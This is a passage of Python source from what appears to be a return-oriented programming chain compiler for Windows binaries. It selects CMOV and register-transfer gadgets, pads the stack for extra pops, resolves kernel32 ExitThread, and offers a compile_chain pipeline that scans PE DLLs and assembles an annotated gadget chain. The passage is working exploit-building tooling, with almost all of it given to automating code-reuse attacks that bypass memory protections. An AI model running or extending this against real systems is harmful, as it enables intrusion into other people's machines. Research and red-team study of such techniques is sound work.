        return best, best_reg

    def _select_cmov(
        self, condition: str, preferred_dst: Optional[set] = None,
    ) -> Tuple[Optional[ClassifiedGadget], str, str]:
        """
        Select the best CMOV gadget with the given condition.

        Args:
            condition: CMOV condition code ('e', 'ne', etc.)
            preferred_dst: If provided, only consider gadgets whose
                           destination register is in this set.
                           e.g., {'rcx', 'ecx'} to avoid a post-CMOV XFER.

        Prefers 64-bit operands (rax, rdx) over 32-bit (eax, edx).
        Returns (gadget, dst_register, src_register) or (None, "", "").
        """
        candidates = self.taxonomy.get(GadgetClass.CMOV)

        best = None
        best_dst = ""
        best_src = ""
        best_score = -1.0

        for g in candidates:
            if g.quality < 0.5:
                continue

            g_cond, dst, src = self._parse_cmov_operands(g.notes)
            if g_cond != condition:
                continue
            if not dst or not src:
                continue

            # Filter by preferred destination register if specified
            if preferred_dst and dst.lower() not in preferred_dst:
                continue

            # Verify we can load both operand registers
            dst_load = self._reg_to_load_class(dst)
            src_load = self._reg_to_load_class(src)
            if dst_load is None or src_load is None:
                continue
            if not self.taxonomy.has(dst_load) or not self.taxonomy.has(src_load):
                continue

            # Prefer 64-bit operands, prefer rax/rdx pair
            score = g.quality
            if dst in ('rax', 'rcx') and src in ('rdx', 'rcx', 'rax'):
                score += 0.3  # Prefer 64-bit
            if dst in ('rax', 'eax') and src in ('rdx', 'edx'):
                score += 0.2  # Prefer rax, rdx pair (matches our loading strategy)

            if score > best_score:
                best = g
                best_dst = dst
                best_src = src
                best_score = score

        return best, best_dst, best_src

    @staticmethod
    def _parse_flag_set_register(notes: str) -> str:
        """Extract the tested register from FLAG_SET notes.
        Notes format: 'eax, 0x8b48fffd' or 'esi, esi' or 'esi, esi with side effects'
        """
        # Strip ' with side effects' suffix
        clean = notes.split(' with side effects')[0].strip()
        # Handle 'memory read [...]' prefix from tiering
        if clean.startswith('memory read'):
            return ""
        if clean.startswith('large displacement'):
            return ""
        if clean.startswith('unparseable'):
            return ""
        # First token before comma
        if ',' in clean:
            reg = clean.split(',')[0].strip().lower()
            # Must be a register name, not a memory operand
            if '[' in reg or 'ptr' in reg:
                return ""
            return reg
        return ""

    @staticmethod
    def _parse_cmov_operands(notes: str) -> Tuple[str, str, str]:
        """Extract condition and operand registers from CMOV notes.
        Notes format: 'condition=e operands=eax, edx' or with ' with side effects'
        """
        condition = ""
        dst = ""
        src = ""

        # Parse condition=XX
        if 'condition=' in notes:
            after_cond = notes.split('condition=')[1]
            condition = after_cond.split()[0].strip()

        # Parse operands=DST, SRC
        if 'operands=' in notes:
            after_ops = notes.split('operands=')[1]
            # Strip ' with side effects'
            after_ops = after_ops.split(' with side effects')[0].strip()
            parts = [p.strip().lower() for p in after_ops.split(',')]
            if len(parts) == 2:
                dst, src = parts

        return condition, dst, src

    @staticmethod
    def _reg_to_load_class(reg: str) -> Optional[GadgetClass]:
        """Map a register name to its LOAD_X GadgetClass."""
        _map = {
            'rax': GadgetClass.LOAD_RAX, 'eax': GadgetClass.LOAD_RAX,
            'rcx': GadgetClass.LOAD_RCX, 'ecx': GadgetClass.LOAD_RCX,
            'rdx': GadgetClass.LOAD_RDX, 'edx': GadgetClass.LOAD_RDX,
            'rbx': GadgetClass.LOAD_RBX, 'ebx': GadgetClass.LOAD_RBX,
            'rsi': GadgetClass.LOAD_RSI, 'esi': GadgetClass.LOAD_RSI,
            'rdi': GadgetClass.LOAD_RDI, 'edi': GadgetClass.LOAD_RDI,
            'rbp': GadgetClass.LOAD_RBP, 'ebp': GadgetClass.LOAD_RBP,
            'r8':  GadgetClass.LOAD_R8,  'r8d': GadgetClass.LOAD_R8,
            'r9':  GadgetClass.LOAD_R9,  'r9d': GadgetClass.LOAD_R9,
        }
        return _map.get(reg.lower())

    def _emit_side_effect_padding(
        self,
        chain: CompiledChain,
        gadget: ClassifiedGadget,
        label: str,
        data_pops: int = 0,
    ):
        """
        Emit padding entries for extra pops beyond data already placed.

        A pop rax; ret gadget has stack_delta=8, but if the caller already
        placed 1 data entry (the value for rax), that consumes the primary
        pop. Only EXTRA pops beyond those need padding.

        Args:
            data_pops: Number of data entries the caller already placed
                       for this gadget (e.g., 1 for a LOAD gadget's value).
        """
        consumed = data_pops * 8
        remaining = gadget.stack_delta - consumed
        if remaining > 0:
            extra = remaining // 8
            for _ in range(extra):
                chain.entries.append(ChainEntry(
                    value=0,
                    role=f"padding: side-effect pop from {label}",
                ))

    def _compile_return_transfer(
        self,
        chain: CompiledChain,
        target_class: GadgetClass,
        call: Call,
        arg_idx: int,
    ):
        """
        Compile a return-value-to-register transfer.

        After a call, the return value is in RAX. If the next call needs
        it in a different register (e.g., RCX), we need a transfer gadget.
        """
        # Direct transfer: do we have XFER_RAX_RCX etc.?
        xfer_map = {
            GadgetClass.LOAD_RCX: GadgetClass.XFER_RAX_RCX,
            GadgetClass.LOAD_RDX: GadgetClass.XFER_RAX_RDX,
        }

        xfer_class = xfer_map.get(target_class)
        if xfer_class and self.taxonomy.has(xfer_class):
            gadget = self.taxonomy.best(xfer_class)
            chain.entries.append(ChainEntry(
                value=gadget.gadget.offset,
                role=f"gadget: {xfer_class.name} ({gadget.gadget.instructions}) [return value transfer]",
                source=f"0x{gadget.gadget.offset:X} in {gadget.gadget.module_path}",
            ))
            # Handle side-effect pops — XFER gadgets often pop extra registers
            if gadget.stack_delta > 0:
                extra_pops = gadget.stack_delta // 8
                for _ in range(extra_pops):
                    chain.entries.append(ChainEntry(
                        value=0,
                        role=f"padding: side-effect pop from {xfer_class.name} transfer",
                    ))
            chain.gadgets_used[xfer_class.name] = gadget.gadget.instructions
            return

        # Fallback: push rax; pop target; ret sequence
        # push_rax would be a STACK_PIVOT (push rax; ret is effectively jmp rax)
        # so this doesn't work directly. Instead, try:
        # pop rax is a no-op if RAX already has the value...
        # Actually the cleanest fallback is if RAX already contains what we need
        # and target is RAX — then no transfer needed
        if target_class == GadgetClass.LOAD_RAX:
            # No transfer needed — value is already in RAX
            return

        chain.errors.append(
            f"Cannot transfer return value (RAX) to {target_class.name}. "
            f"No XFER gadget found. Consider a two-stage approach."
        )

    def _compile_exit(self, chain: CompiledChain, exit_code: int):
        """Append ExitThread(exit_code) to the chain."""
        # The last call already added STACK_ALIGN + shadow space.
        # We just need: LOAD_RCX(exit_code) → alignment → ExitThread.

        # Load exit code
        rcx_gadget = self.taxonomy.best(GadgetClass.LOAD_RCX)
        if rcx_gadget:
            chain.entries.append(ChainEntry(
                value=rcx_gadget.gadget.offset,
                role=f"gadget: LOAD_RCX ({rcx_gadget.gadget.instructions})",
            ))
            chain.entries.append(ChainEntry(
                value=exit_code,
                role=f"data: exit code = 0x{exit_code:X}",
            ))

        # Alignment
        ret_sled = self.taxonomy.best(GadgetClass.RET_SLED)
        if ret_sled:
            chain.entries.append(ChainEntry(
                value=ret_sled.gadget.offset,
                role="gadget: RET_SLED (alignment before ExitThread)",
            ))

        # ExitThread address
        exit_rva = self.resolve_function("kernel32.dll", "ExitThread")
        if exit_rva is not None:
            chain.entries.append(ChainEntry(
                value=exit_rva,
                role="target: kernel32.dll!ExitThread",
            ))
        else:
            chain.warnings.append(
                "ExitThread not resolved — chain has no clean exit. "
                "Add kernel32.dll export table via add_export_table()."
            )


# =============================================================================
# CONVENIENCE — Full pipeline in one call
# =============================================================================

def compile_chain(
    pe_paths: Union[str, List[str]],
    calls: List[Call],
    max_gadget_len: int = 10,
    exit_code: int = 0x99,
) -> CompiledChain:
    """
    Full pipeline: scan PE(s) → classify → compile chain.

    Args:
        pe_paths: Path to PE DLL(s) to use as gadget substrates.
                  Pass a single string or a list of paths.
                  Multiple DLLs are merged into a combined taxonomy.
        calls: List of Call intents to compile.
        max_gadget_len: Maximum gadget byte length for scanner.
        exit_code: Exit code for clean termination.

    Returns:
        CompiledChain with annotated entries.
    """
    if isinstance(pe_paths, str):
        pe_paths = [pe_paths]

    scanner = PEGadgetScanner(max_gadget_len=max_gadget_len)
    classifier = GadgetClassifier()
    combined_taxonomy = Taxonomy()

    for path in pe_paths:
        scan = scanner.scan(path)
        taxonomy = classifier.classify_scan(scan)
        combined_taxonomy.merge(taxonomy)

    compiler = ChainCompiler(combined_taxonomy)
    for path in pe_paths:
        compiler.add_export_table(path)

    return compiler.compile(calls, exit_code=exit_code)
